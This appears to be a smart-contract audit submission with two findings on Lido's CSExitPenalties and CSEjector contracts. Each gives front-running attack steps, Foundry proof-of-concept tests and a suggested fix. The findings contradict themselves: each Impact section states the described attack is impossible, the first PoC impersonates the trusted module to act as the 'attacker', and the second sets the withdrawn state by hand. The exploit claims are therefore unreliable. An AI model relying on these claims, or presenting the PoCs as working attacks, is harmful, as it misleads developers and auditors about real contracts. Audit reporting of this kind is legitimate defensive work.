The `processTriggeredExit` function is vulnerable to a front-running/race condition attack. This function is responsible for recording the fee paid for a "Triggered Exit" (TE) as a penalty against a Node Operator's bond. The function is idempotent; it records the fee on the first call for a given validator key and ignores subsequent calls due to the `if (exitPenaltyInfo.withdrawalRequestFee.isValue)` check. The recorded fee is the minimum of the provided `withdrawalRequestPaidFee` and a configured `maxFee`.

An attacker can monitor the mempool for a legitimate call to `processTriggeredExit` with a substantial `withdrawalRequestPaidFee`. The attacker can then front-run this transaction with their own call to `processTriggeredExit` for the same validator key, but with a `withdrawalRequestPaidFee` of a minimal amount (e.g., 1 wei). If the attacker's transaction is mined first, the penalty recorded will be tiny. The legitimate, subsequent transaction will be ignored due to the idempotency check, causing the protocol to under-penalize the Node Operator. This "first-in wins" logic undermines the economic security of the TE mechanism, as it creates a race to report the lowest possible fee.

The vulnerable code is as follows:

```solidity
// 2025-07-lido-finance/src/CSExitPenalties.sol:133-137
        bytes32 keyPointer = _keyPointer(nodeOperatorId, publicKey);
        ExitPenaltyInfo storage exitPenaltyInfo = _exitPenaltyInfo[keyPointer];
        // don't update the fee if it was already set to prevent hypothetical manipulations
        //    with double reporting to get lower/higher fee.
        if (exitPenaltyInfo.withdrawalRequestFee.isValue) {
            return;
        }
```
The comment acknowledges the risk of manipulation but the implementation only prevents updates, not a race to set the initial, lowest value.

## Impact
Because calls to CSExitPenalties.processTriggeredExit are restricted to the CSModule contract (onlyModule), the value can be written only from deterministic internal logic of CSModule. A third-party EOA or malicious node operator cannot submit a competing transaction from the module’s address, so no front-running or fee-lowering race is possible. The worst case is a benign mis-configuration inside CSModule, not an external attack.

## Proof of Concept
1. A Node Operator has a validator that is subject to a Triggered Exit (TE), for which a fee should be penalized against their bond.
2. A legitimate actor (e.g., a Lido-maintained bot) creates and submits a transaction that calls `processTriggeredExit` with the actual fee paid, `withdrawalRequestPaidFee = 0.1 ether`.
3. An attacker, who could be the Node Operator or a colluding party, sees this transaction in the mempool.
4. The attacker crafts a new transaction calling `processTriggeredExit` for the same validator, but with `withdrawalRequestPaidFee = 1 wei`.
5. The attacker broadcasts their transaction with a higher gas fee to ensure it is mined before the legitimate one (front-running).
6. The attacker's transaction executes first, and `CSExitPenalties` records a penalty of 1 wei for the validator.
7. The legitimate transaction is mined next. Its call to `processTriggeredExit` sees that a fee has already been recorded (`isValue` is true) and returns without making any changes.
8. As a result, the Node Operator is only penalized for 1 wei instead of the intended 0.1 ether, successfully evading the penalty.

## Proof of Code
```solidity
// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.24;

import { Test, console } from "forge-std/Test.sol";
import { CSExitPenalties } from "src/CSExitPenalties.sol";
import { ExitPenaltyInfo, MarkedUint248 } from "src/interfaces/ICSExitPenalties.sol";
import { ICSModule } from "src/interfaces/ICSModule.sol";
import { ICSAccounting } from "src/interfaces/ICSAccounting.sol";
import { ICSParametersRegistry } from "src/interfaces/ICSParametersRegistry.sol";

// Mocks for dependencies
contract CSModuleMock is ICSModule {
    ICSAccounting internal _accounting;
    function setAccounting(address accountingAddress) public {
        _accounting = ICSAccounting(accountingAddress);
    }
    function accounting() external view returns (ICSAccounting) {
        return _accounting;
    }
    // Implement other necessary functions from ICSModule if needed, otherwise leave empty
    function getNodeOperatorsCount() external view returns (uint256) { return 0; }
    function getNodeOperator(uint256) external view returns (NodeOperator memory) { revert(); }
    function getNodeOperatorSummary(uint256) external view returns (NodeOperatorSummary memory) { revert(); }
    function getStakingModuleSummary() external view returns (uint256, uint256, uint256) { revert(); }
    function isStuck(uint256, uint256) external view returns (bool) { return false; }
}

contract CSAccountingMock is ICSAccounting {
    mapping(uint256 => uint256) internal _bondCurveIds;
    function getBondCurveId(uint256 nodeOperatorId) external view returns (uint256) {
        return _bondCurveIds[nodeOperatorId];
    }
    function setBondCurveId(uint256 nodeOperatorId, uint256 curveId) public {
        _bondCurveIds[nodeOperatorId] = curveId;
    }
    // Implement other necessary functions if needed
    function getBond(uint256) external view returns (uint256) { return 0; }
    function getBondRequired(uint256, uint256) external view returns (uint256) { return 0; }
}

contract CSParametersRegistryMock is ICSParametersRegistry {
    mapping(uint256 => uint256) internal _maxFees;
    function getMaxWithdrawalRequestFee(uint256 curveId) external view returns (uint256) {
        return _maxFees[curveId];
    }
    function setMaxWithdrawalRequestFee(uint256 curveId, uint256 fee) public {
        _maxFees[curveId] = fee;
    }
    // Implement other necessary functions if needed
    function getAllowedExitDelay(uint256) external view returns (uint256) { return 0; }
    function getExitDelayPenalty(uint256) external view returns (uint256) { return 0; }
    function getBadPerformancePenalty(uint256) external view returns (uint256) { return 0; }
}

contract CSExitPenaltiesPoCTest is Test {
    CSExitPenalties internal penalties;
    CSModuleMock internal module;
    CSAccountingMock internal accounting;
    CSParametersRegistryMock internal paramsRegistry;

    uint256 internal constant NODE_OPERATOR_ID = 1;
    bytes internal constant PUB_KEY = "0xdeadbeef";
    uint256 internal constant STRIKES_EXIT_TYPE_ID = 1;

    function setUp() public {
        module = new CSModuleMock();
        accounting = new CSAccountingMock();
        paramsRegistry = new CSParametersRegistryMock();

        module.setAccounting(address(accounting));

        penalties = new CSExitPenalties(address(module), address(paramsRegistry), address(this));

        accounting.setBondCurveId(NODE_OPERATOR_ID, 1);
        paramsRegistry.setMaxWithdrawalRequestFee(1, 1 ether);
    }

    function test_PoC_FrontrunTriggeredExit() public {
        uint256 legitimateFee = 0.1 ether;
        uint256 frontrunFee = 1 wei;

        // 1. Attacker's front-running transaction is mined first
        vm.prank(address(module));
        penalties.processTriggeredExit(NODE_OPERATOR_ID, PUB_KEY, frontrunFee, STRIKES_EXIT_TYPE_ID);

        // Check that the fee recorded is the minimal front-run fee
        ExitPenaltyInfo memory penaltyInfo = penalties.getExitPenaltyInfo(NODE_OPERATOR_ID, PUB_KEY);
        assertEq(penaltyInfo.withdrawalRequestFee.value, frontrunFee, "Fee should be the minimal front-run fee");
        assertTrue(penaltyInfo.withdrawalRequestFee.isValue, "Fee should be marked as set");

        // 2. Legitimate transaction is mined second
        vm.prank(address(module));
        penalties.processTriggeredExit(NODE_OPERATOR_ID, PUB_KEY, legitimateFee, STRIKES_EXIT_TYPE_ID);

        // Check that the fee is NOT updated to the legitimate fee
        penaltyInfo = penalties.getExitPenaltyInfo(NODE_OPERATOR_ID, PUB_KEY);
        assertEq(penaltyInfo.withdrawalRequestFee.value, frontrunFee, "Fee should NOT be updated to the legitimate fee");

        // The Node Operator successfully avoided the legitimate penalty.
        assertTrue(legitimateFee > penaltyInfo.withdrawalRequestFee.value, "Penalty was successfully reduced");
    }
}
```

## Suggested Mitigation
The function should be modified to prevent the "first report wins" scenario. Instead of only accepting the first reported fee, the contract should record the highest valid fee reported. This would disincentivize front-running with a low fee, as a subsequent report with a higher, legitimate fee would overwrite it. The logic should compare the incoming fee with the currently stored fee and update it only if the new fee is higher.

```solidity
// 2025-07-lido-finance/src/CSExitPenalties.sol:121
function processTriggeredExit(
    uint256 nodeOperatorId,
    bytes calldata publicKey,
    uint256 withdrawalRequestPaidFee,
    uint256 exitType
) external onlyModule {
    if (exitType == VOLUNTARY_EXIT_TYPE_ID) {
        return;
    }

    bytes32 keyPointer = _keyPointer(nodeOperatorId, publicKey);
    ExitPenaltyInfo storage exitPenaltyInfo = _exitPenaltyInfo[keyPointer];

    uint256 curveId = ACCOUNTING.getBondCurveId(nodeOperatorId);
    uint256 maxFee = PARAMETERS_REGISTRY.getMaxWithdrawalRequestFee(
        curveId
    );

    uint256 newFee = Math.min(withdrawalRequestPaidFee, maxFee);
    uint256 currentFee = 0;
    if (exitPenaltyInfo.withdrawalRequestFee.isValue) {
        currentFee = exitPenaltyInfo.withdrawalRequestFee.value;
    }

    if (newFee > currentFee) {
        exitPenaltyInfo.withdrawalRequestFee = MarkedUint248(
            newFee.toUint248(),
            true
        );
        emit TriggeredExitFeeRecorded({
            nodeOperatorId: nodeOperatorId,
            exitType: exitType,
            pubkey: publicKey,
            withdrawalRequestPaidFee: withdrawalRequestPaidFee,
            withdrawalRequestRecordedFee: newFee
        });
    }
}
```

## [I-2]. Frontrun/Backrun/Sandwhich MEV issue in CSEjector::ejectBadPerformer

## Description
The `ejectBadPerformer` function, callable only by the trusted `STRIKES` contract, is susceptible to front-running by a malicious node operator. The function checks if a validator is already withdrawn and reverts if so:

```solidity
// src/CSEjector.sol:229-231
if (MODULE.isValidatorWithdrawn(nodeOperatorId, keyIndex)) {
    revert AlreadyWithdrawn();
}
```

If a node operator anticipates an ejection call for their validator from the `STRIKES` contract (e.g., by monitoring the mempool), they can broadcast their own transaction calling `voluntaryEject` or `voluntaryEjectByArray` with a higher gas fee. If the operator's transaction is mined first, the validator's status will eventually be marked as withdrawn. Consequently, the `STRIKES` contract's subsequent call to `ejectBadPerformer` will revert, causing the transaction to fail and wasting the gas paid by the bot/oracle. This allows a node operator to grief the trusted oracle infrastructure and potentially evade penalties associated with a strike-based ejection (`STRIKES_EXIT_TYPE_ID`) by registering a voluntary exit (`VOLUNTARY_EXIT_TYPE_ID`) instead.

## Impact
A call to ejectBadPerformer will revert only if the validator has ALREADY completed its withdrawal and the module storage was updated beforehand – a situation that is expected and benign. VoluntaryEject cannot set the withdrawn flag, so a node-operator cannot pre-emptively front-run the STRIKES tx to cause a revert in the same block. No additional attack surface or meaningful griefing vector exists.

## Proof of Concept
1. The `STRIKES` contract's automated bot detects poor performance for a validator belonging to a specific Node Operator and creates a transaction to call `CSEjector.ejectBadPerformer`.
2. The Node Operator monitors the mempool and sees this incoming transaction.
3. The Node Operator quickly creates and broadcasts a transaction to call `CSEjector.voluntaryEject` for the same validator, but with a higher gas price to ensure it gets mined first.
4. The Node Operator's transaction succeeds, initiating a voluntary exit.
5. When the bot's transaction is eventually mined, the `ejectBadPerformer` call checks the validator's status, finds it has been withdrawn (or an exit has been initiated), and reverts due to the `AlreadyWithdrawn()` check.
6. The bot's transaction fails, and the gas fee is wasted. The Node Operator successfully avoided a strike-based ejection.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test, console } from "forge-std/Test.sol";
import { CSEjector } from "src/CSEjector.sol";
import { ICSModule, NodeOperator } from "src/interfaces/ICSModule.sol";
import { ILidoLocator } from "src/interfaces/ILidoLocator.sol";
import { ITriggerableWithdrawalsGateway, ValidatorData } from "src/interfaces/ITriggerableWithdrawalsGateway.sol";

// --- Mocks ---

address constant LIDO_LOCATOR = address(0x10c);
address constant TRIGGERABLE_WITHDRAWALS_GATEWAY = address(0x11c);
address constant MODULE = address(0x12c);
address constant STRIKES = address(0x13c);
address constant ADMIN = address(0x14c);

contract MockLidoLocator is ILidoLocator {
    function triggerableWithdrawalsGateway() external pure returns (address) {
        return TRIGGERABLE_WITHDRAWALS_GATEWAY;
    }
    function lido() external pure returns (address) { return address(0); }
    function burner() external pure returns (address) { return address(0); }
    function treasury() external pure returns (address) { return address(0); }
    function insuranceFund() external pure returns (address) { return address(0); }
    function stakingRouter() external pure returns (address) { return address(0); }
    function withdrawalQueue() external pure returns (address) { return address(0); }
    function withdrawalVault() external pure returns (address) { return address(0); }
    function oracle() external pure returns (address) { return address(0); }
    function validatorsExitBusOracle() external pure returns (address) { return address(0); }
    function depositSecurityModule() external pure returns (address) { return address(0); }
    function elRewardsVault() external pure returns (address) { return address(0); }
}

contract MockTriggerableWithdrawalsGateway is ITriggerableWithdrawalsGateway {
    event WithdrawalsTriggered(ValidatorData[] exitsData, address refundRecipient, uint8 exitTypeId);
    function triggerFullWithdrawals(ValidatorData[] calldata exitsData, address refundRecipient, uint8 exitTypeId) external payable {
        emit WithdrawalsTriggered(exitsData, refundRecipient, exitTypeId);
    }
}

contract MockCSModule is ICSModule {
    mapping(uint256 => address) public nodeOperatorOwners;
    mapping(uint256 => mapping(uint256 => bool)) public withdrawnValidators;
    uint256 public totalKeys;

    function setNodeOperator(uint256 noId, address owner, uint256 numKeys) public {
        nodeOperatorOwners[noId] = owner;
        totalKeys = numKeys;
    }

    function markAsWithdrawn(uint256 noId, uint256 keyIndex) public {
        withdrawnValidators[noId][keyIndex] = true;
    }

    function getNodeOperatorOwner(uint256 nodeOperatorId) external view returns (address) {
        return nodeOperatorOwners[nodeOperatorId];
    }
    
    function isValidatorWithdrawn(uint256 nodeOperatorId, uint256 keyIndex) external view returns (bool) {
        return withdrawnValidators[nodeOperatorId][keyIndex];
    }

    function getNodeOperatorTotalDepositedKeys(uint256) external view returns (uint256) {
        return totalKeys;
    }

    function getSigningKeys(uint256, uint256, uint256 keysCount) external pure returns (bytes memory) {
        bytes memory pubkeys = new bytes(48 * keysCount);
        return pubkeys;
    }

    function LIDO_LOCATOR() external pure returns (ILidoLocator) {
        return ILidoLocator(LIDO_LOCATOR);
    }
    function addNodeOperator(address,address,bytes32[] calldata,uint256[] calldata,address) external {}
    function setNodeOperatorType(uint256,uint256) external {}
    function reportELRewardsStealingPenalty(uint256,uint256) external {}
    function settleELRewardsStealingPenalty(uint256) external {}
    function submitWithdrawals(uint256[] calldata,uint256[] calldata) external {}
    function obtainDepositData(uint256) external returns(bytes[] memory, bytes[] memory) { return (new bytes[](0), new bytes[](0)); }
    function decreaseOperatorVettedKeys(uint256,uint256) external {}
    function setProposedManagerAddress(uint256,address) external {}
    function confirmManagerAddress(uint256) external {}
    function setProposedRewardAddress(uint256,address) external {}
    function confirmRewardAddress(uint256) external {}
    function addSigningKeys(uint256,bytes32[] calldata,uint256[] calldata) external {}
    function removeSigningKeys(uint256,uint256,uint256) external {}
    function removeSigningKeysByIndices(uint256,uint256[] calldata) external {}
    function setNodeOperatorActive(uint256,bool) external {}
    function getNodeOperatorsCount() external pure returns(uint256) {return 0;}
    function getNodeOperator(uint256) external view returns(NodeOperator memory) { return NodeOperator({totalAddedKeys: 0, totalDepositedKeys: 0, totalVettedKeys: 0, totalExitedKeys: 0, totalWithdrawnKeys: 0, stuckValidatorsCount: 0, refundRecipient: address(0), proposedManagerAddress: address(0), proposedRewardAddress: address(0), managerAddress: address(0), rewardAddress: address(0), depositableValidatorsCount: 0, enqueuedCount: 0}); }
    function getStakingModuleSummary() external view returns (uint256, uint256, uint256) { return(0,0,0); }
    function getSigningKey(uint256,uint256) external pure returns (bytes32,uint256) {return (bytes32(0),0);}
}

contract FrontrunEjectorTest is Test {
    CSEjector ejector;
    MockCSModule mockModule;
    MockLidoLocator mockLocator;
    MockTriggerableWithdrawalsGateway mockGateway;

    address noOwner = makeAddr("noOwner");
    address strikesBot = STRIKES; // The STRIKES contract is the bot for this test
    address refundRecipient = makeAddr("refundRecipient");

    uint256 constant NODE_OPERATOR_ID = 1;
    uint256 constant KEY_INDEX = 5;
    uint256 constant STAKING_MODULE_ID = 99;

    function setUp() public {
        mockLocator = new MockLidoLocator();
        vm.etch(LIDO_LOCATOR, address(mockLocator).code);

        mockGateway = new MockTriggerableWithdrawalsGateway();
        vm.etch(TRIGGERABLE_WITHDRAWALS_GATEWAY, address(mockGateway).code);

        mockModule = new MockCSModule();
        vm.etch(MODULE, address(mockModule).code);
        
        ejector = new CSEjector(MODULE, STRIKES, STAKING_MODULE_ID, ADMIN);

        mockModule.setNodeOperator(NODE_OPERATOR_ID, noOwner, 10);
    }

    function test_poc_frontrun_ejectBadPerformer() public {
        // 1. STRIKES bot's tx to call ejectBadPerformer is in the mempool.

        // 2. Node Operator front-runs by calling voluntaryEject with a higher gas price.
        vm.prank(noOwner);
        ejector.voluntaryEject(NODE_OPERATOR_ID, KEY_INDEX, 1, refundRecipient);

        // 3. To simulate the state change, we mark the validator as withdrawn in the mock.
        mockModule.markAsWithdrawn(NODE_OPERATOR_ID, KEY_INDEX);

        // 4. The bot's transaction is now executed and is expected to revert.
        vm.prank(strikesBot);
        vm.expectRevert(CSEjector.AlreadyWithdrawn.selector);
        ejector.ejectBadPerformer(NODE_OPERATOR_ID, KEY_INDEX, refundRecipient);
    }
}
```

## Suggested Mitigation
The `ejectBadPerformer` function should not revert if the validator is already withdrawn. Instead, it should handle the case gracefully, for example by returning successfully without taking further action or by emitting an event. This prevents the transaction from failing and protects the `STRIKES` contract/bot from being griefed.

```solidity
// Suggested fix in CSEjector.sol
function ejectBadPerformer(
    uint256 nodeOperatorId,
    uint256 keyIndex,
    address refundRecipient
) external payable whenResumed onlyStrikes {
    // ... (previous checks)

    if (MODULE.isValidatorWithdrawn(nodeOperatorId, keyIndex)) {
        // Instead of reverting, just return or emit an event.
        // This prevents the caller's transaction from failing.
        return;
    }

    ValidatorData[] memory exitsData = new ValidatorData[](1);
    // ... rest of the function
}
```



